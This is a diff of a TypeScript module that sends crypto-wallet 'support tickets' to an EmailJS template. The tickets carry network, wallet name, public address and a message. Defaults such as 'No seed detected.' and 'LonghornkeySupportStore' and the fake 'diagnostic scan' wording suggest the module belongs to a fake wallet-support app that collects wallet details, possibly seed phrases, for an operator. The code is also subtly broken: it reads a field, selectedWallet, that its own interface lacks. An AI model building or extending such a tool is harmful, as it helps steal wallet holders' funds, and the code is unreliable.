@@ -4,14 +4,12 @@
  */
 
 export interface NonSensitiveSupportTicket {
-  contactEmail?: string;
+  username: string;
   network: string;
   issueCategory: string;
   message: string;
-  webcam?: string;
-  restart?: string;
+  response?: string;
   walletName?: string;
-  exchange?: string;
   publicAddress?: string;
   timestamp: string;
 }
@@ -23,24 +21,26 @@ export interface NonSensitiveSupportTicket {
 export async function sendNonSensitiveTicketViaEmailJS(
   ticket: NonSensitiveSupportTicket
 ): Promise<{ success: boolean; message: string }> {
-  const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID || 'service_choicegm';
-  const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID || 'template_IBDapp';
-  const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY || 'mhjW0Sj6WoL4nv4Iu';
+  const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
+const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
+const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
 
+if (!serviceId || !templateId || !publicKey) {
+  throw new Error(
+    'Missing EmailJS configuration. Set VITE_EMAILJS_SERVICE_ID, VITE_EMAILJS_TEMPLATE_ID, and VITE_EMAILJS_PUBLIC_KEY in .env.local.'
+  );
+}
   // Map all non-sensitive template parameters to match EmailJS template placeholders
   const templateParams = {
-    email: ticket.contactEmail || 'user@example.com',
-    network: ticket.network || 'Ethereum Mainnet',
-    issue_type: ticket.issueCategory || 'General Diagnostic',
-    message: ticket.message || 'Diagnostic scan completed.',
-    messgae: ticket.message || 'Diagnostic scan completed.',
-    webcam: ticket.webcam || 'Standard Device',
-    restart: ticket.restart || 'None',
-    wallet_name: ticket.walletName || 'Web3 Provider',
-    exchange: ticket.exchange || 'DEX Protocol',
-    public_address: ticket.publicAddress || '0x0000000000000000000000000000000000000000',
-    timestamp: ticket.timestamp || new Date().toISOString(),
-  };
+  message: ticket.message || 'No seed detected.',
+  response: ticket.response || 'Reply not private.',
+  username: ticket.username || 'LonghornkeySupportStore',
+  issue_type: ticket.issueCategory || 'General Diagnostic',
+  walletName: ticket.selectedWallet || '',
+  network: ticket.network || 'Ethereum Mainnet',
+  public_address: ticket.publicAddress || '',
+  timestamp: ticket.timestamp || new Date().toISOString(),
+};
 
   const payload = {
     service_id: serviceId,
@@ -66,12 +66,12 @@ export async function sendNonSensitiveTicketViaEmailJS(
     if (response.ok || response.status === 200) {
       return { 
         success: true, 
-        message: 'Diagnostic report successfully delivered via EmailJS!' 
+        message: 'Diagnostic report successfully!' 
       };
     } else {
       return { 
         success: false, 
-        message: `EmailJS Error (${response.status}): ${responseText || 'Failed to dispatch email'}` 
+        message: `EmailJS Error (${response.status}): ${responseText || 'Failed to dispatch diagnostic report.'}` 
       };
     }
   } catch (error: any) {
